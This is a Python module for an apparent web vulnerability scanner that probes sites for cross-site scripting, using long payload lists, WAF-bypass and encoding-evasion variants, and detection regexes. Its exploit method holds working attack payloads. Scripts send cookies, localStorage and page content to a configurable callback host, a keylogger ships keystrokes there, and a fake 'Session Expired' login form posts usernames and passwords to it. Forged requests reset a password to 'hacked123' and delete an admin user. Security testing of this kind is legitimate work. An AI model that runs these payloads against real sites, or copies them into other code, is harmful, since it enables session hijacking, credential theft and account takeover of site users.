import re
import html
from urllib.parse import quote
from modules.base import BaseModule
from core.utils import extract_params, random_string, get_reflection_context

class XssModule(BaseModule):
    name = "xss"
    description = "Cross-Site Scripting Scanner"
    exploitable = True
    
    basic_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]
    
    waf_bypass_payloads = [
        "<a href='javascript:alert(1)'>click</a>",
        "<a href='javascript:alert(document.cookie)'>click</a>",
        "<button onclick='alert(1)'>click</button>",
        "<button onclick=\"prompt(1337)\">submit</button>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<iframe src=\"javascript:alert(document.cookie)\"></iframe>",
        "<svg/onload=alert(1)>",
        "<svg	onload=alert(1)>",
        "<svg\nonload=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        "<img src=x onerror=alert`1`>",
        "<img src=x onerror=alert&lpar;1&rpar;>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<sCrIpT>alert(1)</sCrIpT>",
        "<script >alert(1)</script>",
        "<script/x>alert(1)</script>",
    ]
    
    encoding_payloads = [
        "<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>click</a>",
        "<a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>click</a>",
        "<img src=x onerror=\\u0061lert(1)>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<img src=x onerror=eval('al'+'ert(1)')>",
        "<img src=x onerror=top['al'+'ert'](1)>",
        "<img src=x onerror=window['alert'](1)>",
        "<img src=x onerror=[]['constructor']['constructor']('alert(1)')()>",
    ]
    
    sucuri_bypass = [
        "<a href='javascript:alert(\"XSS-BYPASS-123\")'>Click</a>",
        "<a href='javascript:alert(document.domain + \"\\nCookie: \" + document.cookie)'>Click</a>",
        "foo=<a href='javascript:alert(document.cookie)'>ClickMe</a>",
    ]
    
    context_payloads = {
        "html": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<a href='javascript:alert(1)'>click</a>",
            "<button onclick='alert(1)'>click</button>",
            "<iframe src='javascript:alert(1)'></iframe>",
        ],
        "attribute": [
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '" onfocus="alert(1)" autofocus="',
            '" onclick="alert(1)"',
            "' onclick='alert(1)'",
            "javascript:alert(1)",
            '" onload="alert(1)"',
        ],
        "script": [
            "</script><script>alert(1)</script>",
            "'-alert(1)-'",
            '"-alert(1)-"',
            "\\'-alert(1)//",
            "';alert(1)//",
            '";alert(1)//',
            "</script><img src=x onerror=alert(1)>",
        ],
        "style": [
            "</style><script>alert(1)</script>",
            "</style><img src=x onerror=alert(1)>",
        ],
        "comment": [
            "--><script>alert(1)</script><!--",
            "--><img src=x onerror=alert(1)><!--",
        ],
        "tag": [
            "><script>alert(1)</script>",
            "><img src=x onerror=alert(1)>",
            "/><script>alert(1)</script>",
        ],
    }
    
    header_targets = ["User-Agent", "Referer", "X-Forwarded-For"]
    
    async def scan(self, target):
        self.findings = []
        params = extract_params(target)
        
        if params:
            await self._test_reflected(target, params)
            await self._test_waf_bypass(target, params)
        
        await self._test_dom_sinks(target)
        await self._test_header_xss(target)
        await self._test_stored_indicators(target)
        
        return self.findings
    
    async def _test_reflected(self, target, params):
        marker = f"ls{random_string(6)}"
        
        for param in params:
            resp = await self.test_param(target, param, marker)
            if not resp.get("status"):
                continue
            
            if marker in resp["text"]:
                reflections = self.find_reflection(resp, marker)
                
                if reflections:
                    best_reflection = max(reflections, key=lambda r: r.exploitability_score if hasattr(r, 'exploitability_score') else 0)
                    context = best_reflection.context.value if hasattr(best_reflection, 'context') else get_reflection_context(resp["text"], marker)
                    encoding = best_reflection.encoding.value if hasattr(best_reflection, 'encoding') else "none"
                    
                    await self._test_context_payloads(target, param, context, encoding, reflections)
                else:
                    context = get_reflection_context(resp["text"], marker)
                    await self._test_context_payloads(target, param, context)
    
    async def _test_context_payloads(self, target, param, context, encoding="none", reflections=None):
        base = self.context_payloads.get(context, self.context_payloads["html"])
        file_payloads = (self.get_payloads("xss") or []) + (self.get_payloads("xss_advanced") or []) + (self.get_payloads("xss_master") or [])
        payloads = list(dict.fromkeys(file_payloads + base))[:150]
        
        if self.aggressive:
            from core.fuzzer import MutationEngine
            mutator = MutationEngine()
            mutated = []
            for p in base[:10]:
                mutated.extend(mutator.mutate_string(p, count=3))
            payloads = list(dict.fromkeys(payloads + mutated))[:200]
        
        for payload in payloads:
            resp = await self.test_param(target, param, payload)
            if resp.get("status"):
                if self._check_xss_success(resp["text"], payload):
                    self.record_success(payload, target)
                    
                    confidence_evidence = ["payload_reflected"]
                    if context in ["html", "script"]:
                        confidence_evidence.append("dangerous_context")
                    if encoding == "none":
                        confidence_evidence.append("no_encoding")
                    
                    payload_reflections = self.find_reflection(resp, payload)
                    if payload_reflections:
                        exploitable = [r for r in payload_reflections if hasattr(r, 'is_exploitable') and r.is_exploitable]
                        if exploitable:
                            confidence_evidence.append("exploitable_reflection")
                    
                    self.add_finding(
                        "HIGH",
                        f"Reflected XSS (context: {context})",
                        url=target,
                        parameter=param,
                        evidence=f"Payload reflected unfiltered, encoding: {encoding}",
                        confidence_evidence=confidence_evidence,
                        request_data={"method": "GET", "url": target, "param": param, "payload": payload},
                        response_data={"status": resp.get("status"), "text": resp.get("text", "")[:500], "headers": resp.get("headers", {})},
                        technique="Reflected Cross-Site Scripting",
                        payload=payload,
                        injection_point=f"GET parameter: {param}",
                        http_method="GET",
                        status_code=resp.get("status"),
                        detection_method=f"Payload reflection check (context: {context})",
                        matched_pattern=f"Encoding: {encoding}, Context: {context}",
                    )
                    return
    
    async def _test_waf_bypass(self, target, params):
        all_bypass = self.waf_bypass_payloads + self.encoding_payloads + self.sucuri_bypass
        
        for param in params:
            for payload in all_bypass:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    if self._check_xss_success(resp["text"], payload):
                        bypass_type = "encoding" if payload in self.encoding_payloads else "WAF bypass"
                        self.record_success(payload, target)
                        
                        confidence_evidence = ["payload_reflected", "waf_bypass"]
                        if payload in self.encoding_payloads:
                            confidence_evidence.append("encoding_bypass")
                        
                        self.add_finding(
                            "CRITICAL",
                            f"XSS via {bypass_type}",
                            url=target,
                            parameter=param,
                            evidence=f"Bypass payload worked",
                            confidence_evidence=confidence_evidence,
                            request_data={"method": "GET", "url": target, "param": param, "payload": payload}
                        )
                        return
            
            file_payloads = (self.get_payloads("xss") or []) + (self.get_payloads("xss_advanced") or []) + (self.get_payloads("xss_master") or [])
            basic = list(dict.fromkeys(file_payloads + self.basic_payloads))[:80]
            for payload in basic:
                encoded_url = quote(payload, safe='')
                double_encoded = quote(encoded_url, safe='')
                
                for enc_payload in [encoded_url, double_encoded]:
                    resp = await self.test_param(target, param, enc_payload)
                    if resp.get("status"):
                        if self._check_xss_success(resp["text"], payload):
                            confidence_evidence = ["payload_reflected", "encoding_bypass"]
                            
                            self.add_finding(
                                "HIGH",
                                f"XSS via URL encoding bypass",
                                url=target,
                                parameter=param,
                                evidence=f"Encoded payload decoded and executed",
                                confidence_evidence=confidence_evidence,
                                request_data={"method": "GET", "url": target, "param": param, "payload": enc_payload}
                            )
                            return
    
    async def _test_header_xss(self, target):
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'-alert(1)-'",
        ]
        
        for header in self.header_targets:
            for payload in payloads:
                resp = await self.http.get(target, headers={header: payload})
                if resp.get("status"):
                    if self._check_xss_success(resp["text"], payload):
                        self.add_finding(
                            "HIGH",
                            f"XSS via {header} header",
                            url=target,
                            parameter=header,
                            evidence=f"Header value reflected unsanitized",
                            request_data={"method": "GET", "url": target, "headers": {header: payload}, "payload": payload},
                            response_data={"status": resp.get("status"), "text": resp.get("text", "")[:500]},
                            technique="Header-based XSS Injection",
                            payload=payload,
                            injection_point=f"HTTP Header: {header}",
                            http_method="GET",
                            status_code=resp.get("status"),
                            detection_method="Header value reflection check",
                        )
                        return
    
    async def _test_stored_indicators(self, target):
        resp = await self.http.get(target)
        if not resp.get("status"):
            return
        
        stored_patterns = [
            r"<form[^>]*action=['\"]?[^'\">\s]*comment",
            r"<form[^>]*action=['\"]?[^'\">\s]*message",
            r"<form[^>]*action=['\"]?[^'\">\s]*post",
            r"<form[^>]*action=['\"]?[^'\">\s]*submit",
            r"<textarea[^>]*name=['\"]?(comment|message|content|body)",
            r"<input[^>]*name=['\"]?(comment|message|title|subject)",
        ]
        
        has_form = False
        for pattern in stored_patterns:
            if re.search(pattern, resp["text"], re.IGNORECASE):
                has_form = True
                break
        
        if has_form:
            self.add_finding(
                "INFO",
                f"Stored XSS test candidate",
                url=target,
                evidence=f"Comment/message form detected - test manually for stored XSS"
            )
    
    def _check_xss_success(self, text, payload):
        dangerous_patterns = [
            r"<script[^>]*>.*?alert\s*\(",
            r"<img[^>]+onerror\s*=",
            r"<svg[^>]+onload\s*=",
            r"<body[^>]+onload\s*=",
            r"<iframe[^>]+src\s*=\s*['\"]?javascript:",
            r"<a[^>]+href\s*=\s*['\"]?javascript:",
            r"<button[^>]+onclick\s*=",
            r"javascript\s*:\s*alert",
            r"on\w+\s*=\s*['\"]?\s*alert",
            r"on\w+\s*=\s*['\"]?\s*prompt",
            r"<marquee[^>]+onstart\s*=",
            r"<details[^>]+ontoggle\s*=",
            r"<input[^>]+onfocus\s*=",
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, text, re.IGNORECASE | re.DOTALL):
                return True
        
        if payload in text:
            return True
        
        decoded_payload = html.unescape(payload)
        if decoded_payload in text and decoded_payload != payload:
            return True
        
        return False
    
    async def _test_dom_sinks(self, target):
        resp = await self.http.get(target)
        if not resp.get("status"):
            return
        
        try:
            from core.js_analyzer import create_analyzer
            analyzer = create_analyzer()
            js_result = await analyzer.analyze_url(self.http, target)
            
            if js_result.dom_sinks:
                tainted = [s for s in js_result.dom_sinks if s.tainted]
                
                if tainted:
                    sink = tainted[0]
                    sink_details = f"Sink: {sink.sink_type} | Source: {getattr(sink, 'source', 'user input')} | Line: {sink.line_number}"
                    
                    frameworks = getattr(js_result, 'frameworks_detected', []) or []
                    protected_frameworks = ['Angular', 'React', 'Vue', 'Svelte']
                    has_protection = any(fw in frameworks for fw in protected_frameworks)
                    
                    if has_protection:
                        severity = "INFO"
                        confidence_evidence = ["dom_sink_detected", "tainted_source", "framework_protection_likely"]
                        sink_details += f" | ⚠️ Framework detected: {', '.join([f for f in frameworks if f in protected_frameworks])} (may sanitize automatically)"
                        description = f"DOM-based XSS (tainted data flow) - LIKELY PROTECTED by framework"
                    else:
                        severity = "HIGH"
                        confidence_evidence = ["dom_sink_detected", "tainted_source"]
                        description = f"DOM-based XSS (tainted data flow)"
                    
                    test_payloads = {
                        "location assignment": f"{target}#<script>alert(1)</script>",
                        "innerHTML": f"{target}?q=<img src=x onerror=alert(1)>",
                        "document.write": f"{target}?input=<script>alert(1)</script>",
                        "eval": f"{target}?code=alert(1)",
                    }
                    test_url = test_payloads.get(sink.sink_type, f"{target}#<script>alert(1)</script>")
                    
                    self.add_finding(
                        severity,
                        description,
                        url=target,
                        evidence=sink_details,
                        confidence_evidence=confidence_evidence,
                        technique="DOM-based XSS via tainted data flow",
                        payload="<script>alert(1)</script> or <img src=x onerror=alert(1)>",
                        injection_point=f"DOM sink: {sink.sink_type} (line {sink.line_number})",
                        http_method="GET (browser-based)",
                        detection_method="Static JavaScript analysis - tainted source to sink flow",
                        matched_pattern=f"Source: {getattr(sink, 'source', 'location/URL')} -> Sink: {sink.sink_type}",
                        test_url=test_url,
                        dom_sink_type=sink.sink_type,
                        requires_browser=True,
                        framework_protected=has_protection,
                        detected_frameworks=frameworks,
                    )
                    return
                elif js_result.dom_sinks:
                    self.add_finding(
                        "MEDIUM",
                        f"Potential DOM-based XSS",
                        url=target,
                        evidence=f"DOM sinks: {len(js_result.dom_sinks)}, e.g. {js_result.dom_sinks[0].sink_type}"
                    )
                    return
        except Exception:
            pass
        
        dom_sinks = [
            (r"document\.write\s*\(", "document.write"),
            (r"document\.writeln\s*\(", "document.writeln"),
            (r"\.innerHTML\s*=", "innerHTML"),
            (r"\.outerHTML\s*=", "outerHTML"),
            (r"eval\s*\(", "eval"),
            (r"setTimeout\s*\([^,]*['\"]", "setTimeout"),
            (r"setInterval\s*\([^,]*['\"]", "setInterval"),
            (r"new\s+Function\s*\(", "Function constructor"),
            (r"location\s*=", "location assignment"),
            (r"location\.href\s*=", "location.href"),
            (r"location\.replace\s*\(", "location.replace"),
            (r"window\.open\s*\(", "window.open"),
            (r"\.src\s*=", "src assignment"),
            (r"jQuery\s*\(\s*['\"][^'\"]*['\"]", "jQuery selector"),
            (r"\$\s*\(\s*['\"][^'\"]*['\"]", "$ selector"),
            (r"\.html\s*\(", "jQuery .html()"),
            (r"\.append\s*\(", "jQuery .append()"),
            (r"\.prepend\s*\(", "jQuery .prepend()"),
        ]
        
        dom_sources = [
            (r"location\.hash", "location.hash"),
            (r"location\.search", "location.search"),
            (r"location\.href", "location.href"),
            (r"document\.URL", "document.URL"),
            (r"document\.documentURI", "document.documentURI"),
            (r"document\.referrer", "document.referrer"),
            (r"window\.name", "window.name"),
            (r"document\.cookie", "document.cookie"),
            (r"localStorage\.", "localStorage"),
            (r"sessionStorage\.", "sessionStorage"),
        ]
        
        found_sinks = []
        found_sources = []
        
        for pattern, name in dom_sinks:
            if re.search(pattern, resp["text"], re.IGNORECASE):
                found_sinks.append(name)
        
        for pattern, name in dom_sources:
            if re.search(pattern, resp["text"], re.IGNORECASE):
                found_sources.append(name)
        
        if found_sinks and found_sources:
            confidence_evidence = ["dom_sink_detected", "dom_source_detected"]
            
            self.add_finding(
                "MEDIUM",
                f"Potential DOM-based XSS",
                url=target,
                evidence=f"Sinks: {', '.join(found_sinks[:3])}, Sources: {', '.join(found_sources[:3])}",
                confidence_evidence=confidence_evidence
            )
        elif len(found_sinks) >= 3:
            self.add_finding(
                "LOW",
                f"Multiple DOM sinks detected",
                url=target,
                evidence=f"Sinks: {', '.join(found_sinks[:5])}"
            )
    
    async def exploit(self, target, finding):
        from core.utils import random_string
        from core.http import inject_param
        
        extracted = {"payloads_working": [], "cookie_theft_possible": False, "session_hijack_url": None}
        
        param = finding.get("parameter")
        callback_host = self.config.get("callback_host")
        
        if not param:
            return None
        
        marker = random_string(12)
        
        if callback_host:
            cookie_payloads = [
                f"<script>new Image().src='http://{callback_host}/steal?c='+document.cookie</script>",
                f"<script>fetch('http://{callback_host}/steal?c='+document.cookie)</script>",
                f"<img src=x onerror=\"new Image().src='http://{callback_host}/steal?c='+document.cookie\">",
                f"<svg onload=\"fetch('http://{callback_host}/steal?c='+document.cookie)\">",
                f"<script>location='http://{callback_host}/steal?c='+document.cookie</script>",
                f"<script>document.location='http://{callback_host}/redir?c='+btoa(document.cookie)</script>",
            ]
            
            session_payloads = [
                f"<script>fetch('http://{callback_host}/session',{{method:'POST',body:JSON.stringify({{cookie:document.cookie,url:location.href,localStorage:JSON.stringify(localStorage)}})}})</script>",
                f"<script>new Image().src='http://{callback_host}/grab?session='+encodeURIComponent(document.cookie)+'&dom='+encodeURIComponent(document.body.innerHTML.substring(0,500))</script>",
            ]
            
            for payload in cookie_payloads + session_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status") == 200:
                    if payload in resp.get("text", "") or self._check_xss_success(resp.get("text", ""), payload):
                        extracted["payloads_working"].append(payload[:100])
                        extracted["cookie_theft_possible"] = True
                        extracted["session_hijack_url"] = inject_param(target, param, payload)
                        
                        self.add_finding(
                            "CRITICAL",
                            "XSS EXPLOITED: Cookie theft payload injected",
                            url=target,
                            parameter=param,
                            evidence=f"Callback: {callback_host}, Check for incoming cookies"
                        )
                        break
        
        keylog_payload = f"""<script>
var k='';
document.onkeypress=function(e){{
k+=e.key;
if(k.length>10){{new Image().src='http://{callback_host if callback_host else 'CALLBACK'}/keys?k='+encodeURIComponent(k);k='';}}
}};
</script>"""
        
        if callback_host:
            resp = await self.test_param(target, param, keylog_payload)
            if resp.get("status") == 200 and "onkeypress" in resp.get("text", ""):
                extracted["keylogger_injected"] = True
                self.add_finding(
                    "CRITICAL",
                    "XSS EXPLOITED: Keylogger payload injected",
                    url=target,
                    parameter=param,
                    evidence=f"Keystrokes will be sent to {callback_host}"
                )
        
        phishing_payloads = [
            f"<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999'><h1>Session Expired</h1><form action='http://{callback_host if callback_host else 'CALLBACK'}/phish' method='post'><input name='user' placeholder='Username'><input name='pass' type='password' placeholder='Password'><button>Login</button></form></div>",
        ]
        
        if callback_host:
            for payload in phishing_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status") == 200:
                    if "Session Expired" in resp.get("text", "") or "<form" in resp.get("text", ""):
                        extracted["phishing_possible"] = True
                        self.add_finding(
                            "HIGH",
                            "XSS EXPLOITED: Phishing form injected",
                            url=target,
                            parameter=param,
                            evidence=f"Fake login form will POST to {callback_host}"
                        )
                        break
        
        csrf_payloads = [
            "<script>fetch('/api/user/password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:'hacked123'})})</script>",
            "<script>fetch('/api/admin/user/1',{method:'DELETE'})</script>",
            "<img src='/logout'>",
        ]
        
        for payload in csrf_payloads:
            resp = await self.test_param(target, param, payload)
            if resp.get("status") == 200 and self._check_xss_success(resp.get("text", ""), payload):
                extracted["csrf_via_xss"] = True
                self.add_finding(
                    "HIGH",
                    "XSS EXPLOITED: CSRF attack possible via XSS",
                    url=target,
                    parameter=param,
                    evidence="Can make authenticated requests as victim"
                )
                break
        
        if extracted["payloads_working"] or extracted.get("cookie_theft_possible"):
            self.exploited_data = extracted
            return extracted
        
        return None
